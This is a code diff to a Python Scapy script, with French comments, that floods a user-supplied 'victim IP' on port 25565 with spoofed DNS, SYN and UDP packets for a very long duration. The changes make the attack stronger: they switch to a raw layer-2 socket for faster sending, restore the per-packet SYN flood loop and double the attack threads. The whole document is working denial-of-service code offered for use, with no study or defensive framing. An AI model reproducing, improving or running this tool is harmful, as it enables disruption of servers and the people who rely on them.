@@ -36,6 +36,7 @@ def generate_traffic(destination_ip, destination_port, packet_count):
 def generate_ddos_traffic(destination_ip, destination_port, packet_count, attack_duration):
     global attack_threads, start_time
     attack_end_time = time.time() + attack_duration
+    s = conf.L2socket(iface="Wi-Fi")
 
     def print_statistics():
         global dns_pckts, syn_pckts, udp_pckts, should_clear, start_time
@@ -58,7 +59,7 @@ def generate_ddos_traffic(destination_ip, destination_port, packet_count, attack
                 query_name = destination_ip  # Remplacez par le nom de domaine cible
 
                 packet = IP(src=src_ip, dst=destination_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query_name))
-                send(packet, verbose=0)
+                s.send(packet)
 
                 if not should_clear:
                     dns_pckts += 1
@@ -66,15 +67,15 @@ def generate_ddos_traffic(destination_ip, destination_port, packet_count, attack
     def syn_flood_attack():
         global syn_pckts
         while time.time() < attack_end_time:
-            #for _ in range(packet_count):
-            src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
-            src_port = random.randint(1024, 65535)
+            for _ in range(packet_count):
+                src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
+                src_port = random.randint(1024, 65535)
 
-            packet = IP(src=src_ip, dst=destination_ip) / TCP(sport=src_port, dport=destination_port, flags="S")
-            send(packet, verbose=0)
+                packet = IP(src=src_ip, dst=destination_ip) / TCP(sport=src_port, dport=destination_port, flags="S")
+                s.send(packet)
 
-            if not should_clear:
-                syn_pckts += 1
+                if not should_clear:
+                    syn_pckts += 1
 
 
     def udp_lag_attack():
@@ -85,13 +86,13 @@ def generate_ddos_traffic(destination_ip, destination_port, packet_count, attack
                 src_port = random.randint(1024, 65535)
 
                 packet = IP(src=src_ip, dst=destination_ip) / UDP(sport=src_port, dport=destination_port)
-                send(packet, verbose=0)
+                s.send(packet)
 
                 if not should_clear:
                     udp_pckts += 1
 
     # Ajoutez les fonctions d'attaque spécifiques à la liste des threads
-    for _ in range(10):
+    for _ in range(20):
         attack_threads.append(threading.Thread(target=dns_attack))
         attack_threads.append(threading.Thread(target=syn_flood_attack))
         attack_threads.append(threading.Thread(target=udp_lag_attack))
@@ -107,6 +108,7 @@ def generate_ddos_traffic(destination_ip, destination_port, packet_count, attack
 
 if __name__ == "__main__":
     destination_ip = input("Enter victim IP: ")
+    
     destination_port = 25565  # Remplacez par le port de votre destination
     ddos_traffic_count = 10000
     attack_duration = 6000000  # Durée totale de l'attaque en secondes
